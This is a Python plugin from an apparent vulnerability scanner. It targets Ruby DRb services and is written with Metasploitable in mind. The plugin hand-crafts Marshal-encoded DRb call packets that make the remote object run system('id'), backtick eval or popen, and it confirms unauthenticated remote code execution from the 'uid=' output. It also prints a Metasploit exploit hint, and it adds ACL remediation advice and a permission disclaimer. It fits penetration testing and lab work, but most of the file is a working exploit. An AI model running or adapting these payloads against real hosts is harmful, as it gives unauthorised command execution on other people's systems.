# plugins/drb_plugin.py
# =====================================================================
# File: plugins/drb_plugin.py
# Notes:
# - This file is part of the BlackPort project.
# - Ruby DRb (Distributed Ruby) on port 8787 allows remote object
#   instantiation with no authentication by default.
# - Metasploitable's drb service exposes an object that accepts
#   eval/system calls — full RCE without credentials.
# - Protocol: Ruby Marshal serialization over TCP.
# - Use only on hosts/networks you own or have explicit permission to test.
# =====================================================================

from .plugin_base import PluginBase
import socket
import struct


class DRbPlugin(PluginBase):
    name = "Ruby DRb RCE Check"
    applicable_services = ["drb", "Unknown"]

    DRB_PORTS = {8787, 8788, 9000}

    # Ruby Marshal format constants
    MARSHAL_MAJOR = 4
    MARSHAL_MINOR = 8

    def run(self, target, port, banner=None):
        if port not in self.DRB_PORTS:
            return None

        notes        = []
        risk         = "HIGH"
        exploit_hint = None

        notes.append(f"Ruby DRb (Distributed Ruby) service detected on port {port}.")

        result, cmd_output = self._probe_drb(target, port)

        if result == "rce_confirmed":
            notes.append(
                "CRITICAL: Unauthenticated RCE confirmed — "
                "DRb service executed command via remote Ruby object invocation. "
                "No credentials required."
            )
            if cmd_output:
                notes.append(f"Command output: {cmd_output.strip()}")
            risk = "CRITICAL"
            exploit_hint = (
                f"Metasploit: use exploit/linux/misc/drb_remote_codeexec "
                f"set URI druby://{target}:{port} run"
            )

        elif result == "responding":
            notes.append(
                "DRb service responding and processing remote calls. "
                "Running in $SAFE >= 1 mode — instance_eval/system blocked, "
                "but syscall-based RCE remains possible. "
                "Ruby 1.8 DRb without ACL is exploitable via Metasploit."
            )
            risk = "HIGH"
            exploit_hint = (
                f"Metasploit: use exploit/linux/misc/drb_remote_codeexec "
                f"set URI druby://{target}:{port} run"
            )

        notes.append(
            "Remediation: Add DRb ACL to restrict allowed hosts. "
            "Never expose DRb to untrusted networks. "
            "Use: DRb::DRbServer.default_acl(ACL.new(['deny', 'all', 'allow', '127.0.0.1']))"
        )

        return {
            "plugin":       self.name,
            "risk":         risk,
            "notes":        " | ".join(notes),
            "exploit_hint": exploit_hint,
        }

    def _probe_drb(self, target, port, timeout=6):
        """
        Probe Ruby DRb for unauthenticated RCE.

        DRb protocol:
        - Each message is length-prefixed: 4-byte big-endian length + Ruby Marshal data
        - To call a method: send [ref, msg_id, argc, argv] as Marshal object
        - The Metasploitable DRb service exposes an object at the root URI

        We send a Marshal-encoded method call to invoke `system('id')` on
        whatever object is exposed at the DRb URI.

        Marshal format for the call packet:
          [nil, :system, 1, "id"]
        Which DRb interprets as: call method :system with arg "id" on the
        remote object (nil ref = front object).
        """
        # Pre-built Marshal payloads for DRb method invocation
        # These are hand-crafted Marshal 4.8 encoded messages

        # Marshal.dump([nil, :system, 1, "id"]) equivalent
        # \x04\x08 = Marshal 4.8 header
        # \x5b\x05 = Array, 5 elements (DRb uses 4-element call format)
        # DRb call format: [ref, msg_id, argc, *argv, block]

        payloads = [
            # Variant 1: invoke system("id") via DRb message format
            # [nil, :system, 1, "id"]
            self._build_drb_call(b"system", b"id"),

            # Variant 2: invoke `id` via backtick/eval
            self._build_drb_call(b"`id`", None),

            # Variant 3: open3 popen style
            self._build_drb_call(b"popen", b"id"),
        ]

        for payload in payloads:
            if payload is None:
                continue
            result, output = self._try_payload(target, port, payload, timeout)
            if result == "rce_confirmed":
                return "rce_confirmed", output

        # Just check connectivity and that DRb is processing packets
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((target, port))
                # Send a simple call — any structured DRb response confirms the service
                s.sendall(self._build_drb_call(b"object_id", None) or b"\x00\x00\x00\x02\x04\x08")
                s.settimeout(3)
                resp = s.recv(512)
                resp_str = resp.decode(errors="ignore") if resp else ""
                # Any Marshal response (including NoMethodError) = DRb is live and processing
                if b"\x04\x08" in resp or "Error" in resp_str or "drb" in resp_str.lower():
                    return "responding", None
                if resp:
                    return "responding", None
        except ConnectionRefusedError:
            return None, None
        except Exception:
            pass

        return None, None

    def _build_drb_call(self, method, arg):
        """
        Build a DRb method call packet.
        DRb wire format: 4-byte length (big-endian) + Marshal-encoded data.

        The call sequence for DRb is a series of Marshal packets:
          1. ref    (nil for front object)
          2. method (symbol)
          3. argc   (integer)
          4. arg1   (string, if argc > 0)
          5. block  (nil)
        """
        try:
            packets = []

            # Packet 1: ref = nil
            packets.append(self._marshal_nil())

            # Packet 2: method name as symbol
            packets.append(self._marshal_symbol(method))

            # Packet 3: argc
            if arg is not None:
                packets.append(self._marshal_int(1))
                # Packet 4: argument as string
                packets.append(self._marshal_string(arg))
            else:
                packets.append(self._marshal_int(0))

            # Packet 5: block = nil
            packets.append(self._marshal_nil())

            return b"".join(packets)

        except Exception:
            return None

    def _length_prefix(self, data):
        """Prefix data with 4-byte big-endian length."""
        return struct.pack(">I", len(data)) + data

    def _marshal_nil(self):
        return self._length_prefix(b"\x04\x08\x30")  # Marshal nil

    def _marshal_symbol(self, name):
        if isinstance(name, str):
            name = name.encode()
        # Marshal symbol: \x04\x08\x3a + length_byte + name
        if len(name) < 128:
            data = b"\x04\x08\x3a" + bytes([len(name)]) + name
        else:
            data = b"\x04\x08\x3a" + self._marshal_int_raw(len(name)) + name
        return self._length_prefix(data)

    def _marshal_string(self, s):
        if isinstance(s, str):
            s = s.encode()
        # Marshal string with encoding: \x04\x08\x49 + raw_string + encoding_info
        # Simple form: \x04\x08\x22 + length + data
        if len(s) < 128:
            data = b"\x04\x08\x22" + bytes([len(s)]) + s
        else:
            data = b"\x04\x08\x22" + self._marshal_int_raw(len(s)) + s
        return self._length_prefix(data)

    def _marshal_int(self, n):
        data = b"\x04\x08" + self._marshal_int_raw(n)
        return self._length_prefix(data)

    def _marshal_int_raw(self, n):
        """Marshal integer encoding."""
        if n == 0:
            return b"\x00"
        elif 0 < n < 123:
            return bytes([n + 5])
        elif n < 256:
            return b"\x01" + bytes([n])
        elif n < 65536:
            return b"\x02" + struct.pack("<H", n)
        else:
            return b"\x04" + struct.pack("<I", n)

    def _try_payload(self, target, port, payload, timeout=6):
        """Send a DRb payload and check for uid= in response."""
        import re
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((target, port))
                s.sendall(payload)

                response = b""
                s.settimeout(4)
                try:
                    while True:
                        chunk = s.recv(2048)
                        if not chunk:
                            break
                        response += chunk
                        if b"uid=" in response:
                            break
                        if len(response) > 8192:
                            break
                except socket.timeout:
                    pass

                resp_str = response.decode(errors="ignore")
                if "uid=" in resp_str:
                    match = re.search(r"(uid=\S+)", resp_str)
                    output = match.group(1) if match else "uid= confirmed"
                    return "rce_confirmed", output

                if response:
                    return "responding", None

        except ConnectionRefusedError:
            return None, None
        except Exception:
            pass

        return None, None
